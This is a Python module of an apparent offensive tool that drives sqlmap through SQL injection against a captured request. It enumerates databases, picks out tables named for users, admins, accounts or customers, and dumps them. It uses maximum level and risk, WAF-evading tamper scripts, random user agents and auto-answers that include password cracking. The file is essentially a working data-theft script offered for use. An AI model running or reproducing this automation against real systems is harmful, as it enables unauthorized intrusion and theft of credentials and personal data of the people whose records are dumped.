#!/usr/bin/env python3
"""
G0BurpSQLmaPI - Users Dump Module
Dumps users and finds all tables containing user data
Preserves original sqlmap output with colors
Author: nu11secur1ty
License: GPL-3.0
"""

import os
import sys
import json
import time
import shutil
import subprocess
import re
from pathlib import Path

try:
    from colorama import init, Fore, Style
    init(autoreset=True, convert=True)
except Exception:
    class _C:
        def __getattr__(self, _): return ""
    Fore = Style = _C()

# ============================================================================
# PATHS
# ============================================================================

ROOT = Path.cwd()
MODULES_DIR = ROOT / "modules"
EXPLOIT_PATH = MODULES_DIR / "exploit.txt"
META_PATH = MODULES_DIR / "exploit_meta.json"
AUTH_PATH = MODULES_DIR / "auth_config.json"

# SQLMap configuration
SQLMAP_ENV_VAR = "G0_SQLMAP_PATH"
SQLMAP_DEFAULT_PATHS = [
    "D:/CVE/sqlmap-nu11secur1ty/sqlmap.py",
    "/usr/bin/sqlmap",
    "/usr/local/bin/sqlmap",
    "sqlmap.py",
]

# ============================================================================
# YOUR TECHNIQUES - RISK LEVEL, TAMPERS, ETC
# ============================================================================

# SQLMAP ADVANCED OPTIONS - YOUR TECHNIQUES
SQLMAP_LEVEL = "5"
SQLMAP_RISK = "3"
SQLMAP_TIME_SEC = "11"
SQLMAP_TAMPERS = "space2comment,between,charencode"
SQLMAP_NO_CAST = "--no-cast"
SQLMAP_NO_ESCAPE = "--no-escape"
SQLMAP_RANDOM_AGENT = "--random-agent"
SQLMAP_FLUSH_SESSION = "--flush-session"
SQLMAP_THREADS = "10"
SQLMAP_TIMEOUT = "30"
SQLMAP_RETRIES = "3"
SQLMAP_UNION_CHAR = "UCHAR"

# Keywords for user tables
USER_TABLE_KEYWORDS = [
    'user', 'users', 'admin', 'admins', 'member', 'members',
    'login', 'logins', 'account', 'accounts', 'profile', 'profiles',
    'customer', 'customers', 'employee', 'employees',
    'auth', 'role', 'roles', 'wp_users', 'admin_users'
]

# SQLMAP ANSWERS
SQLMAP_ANSWERS = "continue=Y,quit=N,proceed=Y,crack=Y,dict=Y,resolve=Y,follow=Y,test=Y"

# ============================================================================
# FUNCTIONS
# ============================================================================

def display_banner():
    """Display module banner"""
    print(Fore.CYAN + """
╔═══════════════════════════════════════════════════════════════╗
║                    👥 USERS DUMP MODULE                       ║
║      SCANS FOR ANY TABLE WITH USER DATA                       ║
║                   Author: nu11secur1ty                        ║
╚═══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

def find_sqlmap():
    """Find sqlmap installation"""
    env_path = os.getenv(SQLMAP_ENV_VAR)
    if env_path:
        p = Path(env_path)
        if p.exists():
            return str(p)
    
    for path in SQLMAP_DEFAULT_PATHS:
        if Path(path).exists():
            return path
    
    for candidate in ("sqlmap.py", "sqlmap"):
        found = shutil.which(candidate)
        if found:
            return found
    return None

def load_exploit():
    """Load exploit file and parameters"""
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "❌ exploit.txt not found! Generate PoC first." + Style.RESET_ALL)
        return None, None
    
    try:
        vuln_params = []
        if META_PATH.exists():
            with open(META_PATH, 'r') as f:
                meta = json.load(f)
                vuln_params = meta.get("vuln_params", [])
        return EXPLOIT_PATH, vuln_params
    except Exception as e:
        print(Fore.RED + f"❌ Error loading exploit: {e}" + Style.RESET_ALL)
        return None, None

def get_base_cmd(sqlmap_path, exploit_path, vuln_params):
    """
    Build base sqlmap command with YOUR TECHNIQUES
    """
    if sqlmap_path.endswith(".py"):
        cmd = [sys.executable, sqlmap_path]
    else:
        cmd = [sqlmap_path]
    
    cmd += [
        "-r", str(exploit_path),
        f"--level={SQLMAP_LEVEL}",
        f"--risk={SQLMAP_RISK}",
        f"--time-sec={SQLMAP_TIME_SEC}",
        f"--tamper={SQLMAP_TAMPERS}",
        SQLMAP_NO_CAST,
        SQLMAP_NO_ESCAPE,
        SQLMAP_RANDOM_AGENT,
        SQLMAP_FLUSH_SESSION,
        f"--threads={SQLMAP_THREADS}",
        f"--timeout={SQLMAP_TIMEOUT}",
        f"--retries={SQLMAP_RETRIES}",
        f"--union-char={SQLMAP_UNION_CHAR}",
        "--batch",
        f"--answers={SQLMAP_ANSWERS}",
    ]
    
    if vuln_params:
        cmd += ["-p", ",".join(vuln_params)]
    
    return cmd

def run_sqlmap_with_techniques(cmd, description=""):
    """
    Run sqlmap with YOUR TECHNIQUES and capture output
    """
    if description:
        print(Fore.CYAN + f"\n[+] {description}" + Style.RESET_ALL)
    
    print(Fore.YELLOW + "[*] Running sqlmap with your techniques (level=5, risk=3, time-sec=11, tamper=space2comment,between,charencode)..." + Style.RESET_ALL)
    print("-" * 60)
    
    try:
        result = subprocess.run(cmd, check=False)
        
        cmd_capture = cmd.copy()
        capture_result = subprocess.run(cmd_capture, capture_output=True, text=True, check=False)
        output = capture_result.stdout + capture_result.stderr
        
        return output
        
    except Exception as e:
        print(Fore.RED + f"❌ Error: {e}" + Style.RESET_ALL)
        return ""

def get_databases(sqlmap_path, exploit_path, vuln_params):
    """
    Get all databases using sqlmap --dbs with YOUR TECHNIQUES
    """
    print(Fore.CYAN + "\n[+] Getting databases with your techniques..." + Style.RESET_ALL)
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    cmd.append("--dbs")
    
    output = run_sqlmap_with_techniques(cmd, "Getting databases")
    
    if not output:
        return []
    
    databases = []
    for line in output.split('\n'):
        match = re.search(r'\[\*\]\s+(\w+)', line)
        if match:
            db = match.group(1)
            if db not in ['information_schema', 'performance_schema', 'mysql', 'sys']:
                databases.append(db)
    
    if not databases:
        print(Fore.YELLOW + "[!] No databases found. Using current database." + Style.RESET_ALL)
        databases = [None]
    
    return databases

def get_tables_from_db(sqlmap_path, exploit_path, vuln_params, database):
    """
    Get all tables from a database using sqlmap --tables with YOUR TECHNIQUES
    """
    db_name = database if database else "current database"
    print(Fore.CYAN + f"[*] Getting tables from: {db_name} with your techniques..." + Style.RESET_ALL)
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    
    if database:
        cmd += ["-D", database]
    
    cmd.append("--tables")
    
    output = run_sqlmap_with_techniques(cmd, f"Getting tables from {db_name}")
    
    if not output:
        return []
    
    tables = []
    for line in output.split('\n'):
        match = re.search(r'\|+\s*(\w+)\s*\|+', line)
        if match:
            table = match.group(1)
            if table and len(table) > 1 and table not in ['Table', '---', 'tables']:
                tables.append(table)
        
        match = re.search(r'\[\*\]\s+(\w+)', line)
        if match:
            table = match.group(1)
            if table and len(table) > 1:
                tables.append(table)
    
    return list(set(tables))

def find_user_tables(sqlmap_path, exploit_path, vuln_params):
    """
    Find all user tables using sqlmap with YOUR TECHNIQUES
    """
    print(Fore.CYAN + "\n[+] Finding ALL user tables using your techniques (level=5, risk=3, time-sec=11)..." + Style.RESET_ALL)
    
    # Step 1: Get databases
    databases = get_databases(sqlmap_path, exploit_path, vuln_params)
    
    if not databases:
        print(Fore.YELLOW + "[!] No databases found." + Style.RESET_ALL)
        return []
    
    # Step 2: Get tables from each database
    all_tables = []
    
    for db in databases:
        tables = get_tables_from_db(sqlmap_path, exploit_path, vuln_params, db)
        
        # Filter for user-related tables
        for table in tables:
            table_lower = table.lower()
            if any(kw in table_lower for kw in USER_TABLE_KEYWORDS):
                full_name = f"{db}.{table}" if db else table
                if full_name not in all_tables:
                    all_tables.append(full_name)
    
    return sorted(set(all_tables))

def dump_user_table(sqlmap_path, exploit_path, vuln_params, full_table_name):
    """
    Dump a user table using sqlmap --dump with YOUR TECHNIQUES
    """
    print(Fore.CYAN + f"\n[+] Dumping table: {full_table_name} with your techniques..." + Style.RESET_ALL)
    
    if '.' in full_table_name:
        db, table = full_table_name.split('.', 1)
    else:
        db = None
        table = full_table_name
    
    cmd = get_base_cmd(sqlmap_path, exploit_path, vuln_params)
    
    if db:
        cmd += ["-D", db]
    
    cmd += [
        "-T", table,
        "--dump",
    ]
    
    print(Fore.YELLOW + f"[*] Dumping {full_table_name} with level={SQLMAP_LEVEL}, risk={SQLMAP_RISK}, time-sec={SQLMAP_TIME_SEC}..." + Style.RESET_ALL)
    print(Fore.YELLOW + "[!] Press Ctrl+C to skip this table" + Style.RESET_ALL)
    print("-" * 60)
    
    try:
        output = run_sqlmap_with_techniques(cmd, f"Dumping {full_table_name}")
        
        if output and "Table: " in output and "entries" in output:
            print(Fore.GREEN + f"\n[+] Successfully dumped {full_table_name}" + Style.RESET_ALL)
            return True
        else:
            print(Fore.YELLOW + f"\n[!] No data found in {full_table_name}" + Style.RESET_ALL)
            return False
            
    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n[!] Skipped {full_table_name}" + Style.RESET_ALL)
        return False
    except Exception as e:
        print(Fore.RED + f"❌ Error dumping {full_table_name}: {e}" + Style.RESET_ALL)
        return False

def run_users_dump():
    """Main function - find and dump ALL user tables using YOUR TECHNIQUES"""
    display_banner()
    
    # Check if exploit exists
    if not EXPLOIT_PATH.exists():
        print(Fore.RED + "❌ exploit.txt not found!" + Style.RESET_ALL)
        print(Fore.YELLOW + "Please generate PoC first using option 1 from main menu." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Find sqlmap
    sqlmap_path = find_sqlmap()
    if not sqlmap_path:
        print(Fore.RED + "❌ sqlmap not found!" + Style.RESET_ALL)
        print(Fore.YELLOW + f"Set {SQLMAP_ENV_VAR} or install sqlmap." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Load exploit
    exploit_path, vuln_params = load_exploit()
    if not exploit_path:
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show configuration with YOUR TECHNIQUES
    print(Fore.CYAN + "\n[*] Configuration with YOUR TECHNIQUES:" + Style.RESET_ALL)
    print(f"    SQLMap: {sqlmap_path}")
    print(f"    Exploit: {exploit_path}")
    print(f"    Level: {SQLMAP_LEVEL}")
    print(f"    Risk: {SQLMAP_RISK}")
    print(f"    Time-Sec: {SQLMAP_TIME_SEC}")
    print(f"    Tamper: {SQLMAP_TAMPERS}")
    print(f"    No-Cast: {SQLMAP_NO_CAST}")
    print(f"    No-Escape: {SQLMAP_NO_ESCAPE}")
    if vuln_params:
        print(f"    Parameters: {vuln_params}")
    print()
    
    # Confirm
    confirm = input(Fore.YELLOW + "Start USERS scan and dump with your techniques? [Y/n]: " + Style.RESET_ALL).strip().lower()
    if confirm not in ("", "y", "yes"):
        print(Fore.YELLOW + "Cancelled." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 1: Find all user tables using YOUR TECHNIQUES
    user_tables = find_user_tables(sqlmap_path, exploit_path, vuln_params)
    
    if not user_tables:
        print(Fore.YELLOW + "\n[!] No user tables found!" + Style.RESET_ALL)
        print(Fore.YELLOW + "[!] The database may not contain user tables." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # Show found tables
    print(Fore.CYAN + "\n" + "="*60)
    print("FOUND USER TABLES:")
    print("="*60 + Style.RESET_ALL)
    for i, table in enumerate(user_tables, 1):
        print(f"{i}. {table}")
    print("="*60)
    
    # Ask which tables to dump
    dump_all = input(Fore.YELLOW + "\nDump ALL tables? [Y/n]: " + Style.RESET_ALL).strip().lower()
    
    tables_to_dump = []
    if dump_all in ("", "y", "yes"):
        tables_to_dump = user_tables
    else:
        print(Fore.CYAN + "Enter table numbers to dump (comma-separated, e.g., 1,3,5):" + Style.RESET_ALL)
        selection = input(Fore.YELLOW + "Selection: " + Style.RESET_ALL).strip()
        if selection:
            try:
                indices = [int(x.strip()) - 1 for x in selection.split(",") if x.strip()]
                tables_to_dump = [user_tables[i] for i in indices if 0 <= i < len(user_tables)]
            except:
                print(Fore.RED + "❌ Invalid selection." + Style.RESET_ALL)
                input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
                return
    
    if not tables_to_dump:
        print(Fore.YELLOW + "No tables selected." + Style.RESET_ALL)
        input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)
        return
    
    # STEP 2: Dump selected tables with YOUR TECHNIQUES
    print(Fore.CYAN + "\n" + "="*60)
    print(f"DUMPING {len(tables_to_dump)} USER TABLES WITH YOUR TECHNIQUES")
    print("="*60 + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Using: level={SQLMAP_LEVEL}, risk={SQLMAP_RISK}, time-sec={SQLMAP_TIME_SEC}" + Style.RESET_ALL)
    print(Fore.CYAN + f"[*] Tamper: {SQLMAP_TAMPERS}" + Style.RESET_ALL)
    print(Fore.CYAN + "[*] SQLmap will save results to its default output directory" + Style.RESET_ALL)
    print(Fore.CYAN + "[*] SQLmap output will appear below with original colors:" + Style.RESET_ALL)
    print("="*60)
    
    success_count = 0
    for i, table in enumerate(tables_to_dump, 1):
        print(Fore.CYAN + f"\n[{i}/{len(tables_to_dump)}] Processing: {table}" + Style.RESET_ALL)
        print(Fore.CYAN + "="*60 + Style.RESET_ALL)
        
        if dump_user_table(sqlmap_path, exploit_path, vuln_params, table):
            success_count += 1
    
    # Summary
    print(Fore.CYAN + "\n" + "="*60)
    print("USERS DUMP COMPLETE")
    print("="*60 + Style.RESET_ALL)
    print(Fore.GREEN + f"✅ Successfully dumped: {success_count}/{len(tables_to_dump)} tables" + Style.RESET_ALL)
    print(Fore.YELLOW + "📁 SQLmap saved CSV files in its default output directory" + Style.RESET_ALL)
    print(Fore.CYAN + "💡 Check sqlmap output directory for CSV files with user data" + Style.RESET_ALL)
    print("="*60)
    
    input(Fore.CYAN + "\nPress Enter to exit..." + Style.RESET_ALL)

# ============================================================================
# MAIN ENTRYPOINT
# ============================================================================

if __name__ == "__main__":
    run_users_dump()
